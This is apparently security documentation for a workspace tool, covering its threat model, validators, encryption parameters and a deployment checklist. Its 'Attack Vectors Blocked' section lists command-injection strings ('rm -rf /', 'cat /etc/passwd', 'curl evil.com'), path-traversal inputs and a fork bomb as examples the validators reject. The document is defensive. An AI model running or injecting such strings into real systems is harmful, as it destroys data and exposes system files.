# Workspace Security Documentation

## Security Model

The flexible workspace system implements defense-in-depth security:

1. **Input Validation** - All user inputs validated
2. **Path Validation** - TOCTOU-safe path checking
3. **Command Validation** - Allowlist-based execution
4. **Credential Encryption** - AES-256-GCM with scrypt KDF
5. **Host Key Verification** - SSH MITM protection
6. **Rate Limiting** - API brute force prevention

## Threat Model

### Threats Addressed

1. **Path Traversal** ✅
   - PathValidator uses realpath() for canonicalization
   - Checks before and after filesystem operations (TOCTOU-safe)
   - Blocks: `../`, absolute paths, symlink escaping

2. **Command Injection** ✅
   - Git URLs: Blocked shell metacharacters
   - Branch names: Validated against git ref format
   - SSH hostnames: Alphanumeric + dash + dot only
   - SSH usernames: Same pattern as hostnames
   - Sparse checkout paths: Relative paths only

3. **Credential Exposure** ✅
   - Keychain storage (OS-level protection)
   - AES-256-GCM encryption for fallback
   - No credentials in logs
   - Master password required (min 8 chars)

4. **Man-in-the-Middle (SSH)** ✅
   - Host key verification (3 modes)
   - SHA256 fingerprints
   - Warning on key changes
   - Persistent known_hosts storage

5. **Resource Exhaustion** ✅
   - Workspace limit: 20 max
   - SSH connection pooling: 5 per host
   - Git storage: 5GB limit with LRU eviction
   - Rate limiting: 10 requests/10s per IP

6. **Concurrent Access** ✅
   - File locking (FileLockManager)
   - Atomic writes (temp + rename)
   - Timeout on lock contention

## Attack Vectors Blocked

### Command Injection

All these attacks are blocked:

```bash
# Git URLs
https://github.com/user/repo.git; rm -rf /
https://github.com/user/repo.git && cat /etc/passwd
git@github.com:user/repo.git`whoami`

# Branch names
main"; rm -rf /
develop$(curl evil.com)
feature && cat /etc/passwd

# SSH hostnames
server.com; rm -rf /
host`whoami`
example.com && curl evil.com

# Sparse checkout
src && rm -rf /
docs; curl evil.com
```

### Path Traversal

```bash
../../../etc/passwd          # Blocked
/etc/passwd                  # Blocked
dir/../../outside            # Blocked
```

### Fork Bombs

```bash
:(){ :|:& };:               # Blocked by CommandValidator
```

## Security Best Practices

### For Users

1. **Use SSH Keys**: More secure than passwords
2. **Enable Host Key Verification**: Use "strict" mode in production
3. **Set Master Password**: Strong passphrase for encrypted credentials
4. **Review Connections**: Regularly audit connected workspaces
5. **Close Unused**: Disconnect workspaces when not in use

### For Developers

1. **Validate All Inputs**: Never trust user input
2. **Use Existing Validators**: PathValidator, CommandValidator
3. **No String Interpolation**: Use parameterized commands when possible
4. **Atomic Operations**: Use temp + rename pattern for writes
5. **Proper Error Handling**: Don't leak sensitive info in errors

## Credential Key Format

Credentials are stored with composite keys to prevent collisions:

**SSH:**
```
Service: claude-workspace-ssh
Account: username@hostname:port:password
         username@hostname:port:privateKey
```

**Git:**
```
Service: claude-workspace-git
Account: repoUrl:username
```

Including the port in SSH keys prevents credential confusion between same host on different ports.

## Encryption Details

**Algorithm:** AES-256-GCM
**Key Derivation:** scrypt (N=16384, r=8, p=1)
**Key Length:** 32 bytes (256 bits)
**IV Length:** 16 bytes (128 bits)
**Salt Length:** 32 bytes
**Tag Length:** 16 bytes (128 bits)

**File Format:**
```
[salt(32)] [iv(16)] [tag(16)] [encrypted data]
```

## Audit Logging

All security events are logged:

- Credential access (get/set/delete)
- Connection attempts (success/failure)
- Path validation failures
- Command validation failures
- Rate limit violations
- Host key verification events

## Compliance

- **OWASP Top 10**: Addressed injection, broken access control, cryptographic failures
- **CWE-22**: Path Traversal - Mitigated via PathValidator
- **CWE-78**: Command Injection - Mitigated via input validation
- **CWE-327**: Weak Crypto - Uses AES-256-GCM with scrypt KDF
- **CWE-200**: Information Exposure - Error stacks only in development

## Security Checklist

Before deploying:

- [ ] Review all PathValidator usage
- [ ] Audit CommandValidator allowlist
- [ ] Verify credential encryption working
- [ ] Test host key verification modes
- [ ] Enable rate limiting in production
- [ ] Review error messages for leaks
- [ ] Set strong master password
- [ ] Enable strict host key mode for production
- [ ] Audit all file write operations (atomic?)
- [ ] Review all command executions (validated?)
